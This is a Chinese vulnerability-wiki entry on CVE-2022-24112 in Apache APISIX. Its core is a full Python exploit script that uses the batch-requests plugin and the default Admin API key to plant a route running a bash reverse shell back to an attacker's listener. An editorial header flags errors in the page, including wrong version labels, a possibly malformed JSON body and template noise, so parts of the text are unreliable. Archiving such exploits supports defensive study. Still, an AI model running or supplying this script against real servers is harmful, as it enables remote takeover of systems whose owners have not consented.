---
cve: "CVE-2022-24112"
title: "【0day EXP】Apache APISIX 2.12.1 远程执行代码 （RCE）"
product: "Apache APISIX batch-requests/Admin API"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "active"
primary_identifiers: "CVE-2022-24112"
referenced_identifiers: ""
identifier_role: "primary"
prerequisites: "batch-requests启用、Admin同数据面端口且默认key/访问限制可被内循环突破；一般影响还含数据面IP限制绕过"
source_url: "https://mp.weixin.qq.com/s/DC2aFjVBEyHrUE63SWJm2g"
source_status: "recorded"
side_effects: "含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。"
id: "vw-55636c3fd40c336a25defc0d"
entity_id: "ve-55636c3fd40c336a25defc0d"
schema_version: "1"
---

# 【0day EXP】Apache APISIX 2.12.1 远程执行代码 （RCE）

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：batch-requests启用、Admin同数据面端口且默认key/访问限制可被内循环突破；一般影响还含数据面IP限制绕过
- 证据范围：正文正确列2.12.1/2.10.4固定版本，但标题/脚本头却称2.12.1 RCE导致安全版误标

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- 标题与代码版本应改为<2.12.1并分LTS分支
- Python嵌套JSON含\}污染，路由body可能非法；target_url直接连接依赖末尾/
- 固定Host/外部上游schmidt-schaefer.com非必要且无说明
- 无响应判断/清理，创建固定route覆盖潜在已有资源；大量Valentines模板噪声

### 操作风险与资料使用

- 含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

<meta name="referrer" content="no-referrer"/>

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/DC2aFjVBEyHrUE63SWJm2g)

VALENTINE'S DAY

VALENTINE'S DAY

VALENTINE'S DAY

VALENTINE'S DAY

VALENTINE'S DAY

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失,均由使用者本人负责，EXP 与 POC 仅仅只供对已授权的目标使用测试，对未授权目标的测试本文库不承担责任，均由本人自行承担。本文库中的漏洞均为公开的漏洞收集！如果本文您认为不适宜被发布，请在后台联系我们删除，或发送到运营的电子邮箱：tang_wenshu@outlook.com。

VALENTINE'S DAY

VALENTINE'S DAY

VALENTINE'S DAY

VALENTINE'S DAY

VALENTINE'S DAY

漏洞说明
----

Apache APISIX官方发布安全公告，披露在 Apache APISIX 2.12.1 之前的版本中存在一处远程代码执行漏洞（CVE-2022-24112）。在启用 Apache APISIX batch-requests 插件后，攻击者通过 batch-requests 插件绕过 Apache APISIX 数据面的 IP 限制（如绕过 IP 黑白名单限制）。如果用户使用 Apache APISIX 默认配置（启用 Admin API ，使用默认 Admin Key 且没有额外分配管理端口），攻击者可以通过 batch-requests 插件调用 Admin API ，导致远程代码执行。

**威胁级别：**【严重】

**影响版本：**

Apache APISIX 1.3 ~ 2.12.1 之间的所有版本（不包含 2.12.1 ）

Apache APISIX 2.10.0 ~ 2.10.4 LTS 之间的所有版本 （不包含 2.10.4）

**安全版本：**

Apache APISIX 2.12.1

Apache APISIX 2.10.4  (LTS versions)

漏洞EXP
-----

```
# Exploit Title: Apache APISIX 2.12.1 - Remote Code Execution (RCE)  
# Date: 2022-03-16  
# Exploit Author: Ven3xy  
# Vendor Homepage: https://apisix.apache.org/  
# Version: Apache APISIX 1.3 – 2.12.1  
# Tested on: CentOS 7  
# CVE : CVE-2022-24112    
  
  
import requests  
import sys  
  
class color:  
    HEADER = '\033[95m'  
    IMPORTANT = '\33[35m'  
    NOTICE = '\033[33m'  
    OKBLUE = '\033[94m'  
    OKGREEN = '\033[92m'  
    WARNING = '\033[93m'  
    RED = '\033[91m'  
    END = '\033[0m'  
    UNDERLINE = '\033[4m'  
    LOGGING = '\33[34m'  
color_random=[color.HEADER,color.IMPORTANT,color.NOTICE,color.OKBLUE,color.OKGREEN,color.WARNING,color.RED,color.END,color.UNDERLINE,color.LOGGING]      
      
  
def banner():  
    run = color_random[6]+'''\n                                   .     ,   
        _.._ * __*\./ ___  _ \./._ | _ *-+-  
       (_][_)|_) |/'\     (/,/'\[_)|(_)| |   
          |                     |            
\n'''  
    run2 = color_random[2]+'''\t\t(CVE-2022-24112)\n'''             
    run3 = color_random[4]+'''{ Coded By: Ven3xy  | Github: https://github.com/M4xSec/ }\n\n'''  
    print(run+run2+run3)      
  
if (len(sys.argv) != 4):  
    banner()  
    print("[!] Usage   : ./apisix-exploit.py <target_url> <lhost> <lport>")  
    exit()  
      
else:  
    banner()  
    target_url = sys.argv[1]    
    lhost = sys.argv[2]  
    lport = sys.argv[3]  
      
headers1 = {  
    'Host': '127.0.0.1:8080',  
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.81 Safari/537.36 Edg/97.0.1072.69',  
    'X-API-KEY': 'edd1c9f034335f136f87ad84b625c8f1',  
    'Accept': '*/*',  
    'Accept-Encoding': 'gzip, deflate',  
    'Content-Type': 'application/json',  
    'Content-Length': '540',  
    'Connection': 'close',  
}  
  
headers2 = {  
    'Host': '127.0.0.1:8080',  
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.81 Safari/537.36 Edg/97.0.1072.69',  
    'X-API-KEY': 'edd1c9f034335f136f87ad84b625c8f1',  
    'Accept': '*/*',  
    'Accept-Encoding': 'gzip, deflate',  
    'Content-Type': 'application/json',  
    'Connection': 'close',  
}  
  
json_data = {  
    'headers': {  
        'X-Real-IP': '127.0.0.1',  
        'X-API-KEY': 'edd1c9f034335f136f87ad84b625c8f1',  
        'Content-Type': 'application/json',  
    },  
    'timeout': 1500,  
    'pipeline': [  
        {  
            'path': '/apisix/admin/routes/index',  
            'method': 'PUT',  
            'body': '{"uri":"/rms/fzxewh","upstream":{"type":"roundrobin","nodes":{"schmidt-schaefer.com":1\}\},"name":"wthtzv","filter_func":"function(vars) os.execute(\'bash -c \\\\\\"0<&160-;exec 160<>/dev/tcp/'+lhost+'/'+lport+';sh <&160 >&160 2>&160\\\\\\"\'); return true end"}',  
        },  
    ],  
}  
  
response1 = requests.post(target_url+'apisix/batch-requests', headers=headers1, json=json_data, verify=False)  
  
response2 = requests.get(target_url+'rms/fzxewh', headers=headers2, verify=False)  

```

  

![图片](../../.resource/remote/dbc12ea2c16fbb1243cde440271664ad4b084742e25e4752e4673b6c17127072.jpg)

![图片](../../.resource/remote/f10e0a321721fd223c04a48f3af4e1df0b3d6ed32f6d44de107361a6d3464b23.jpg)

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
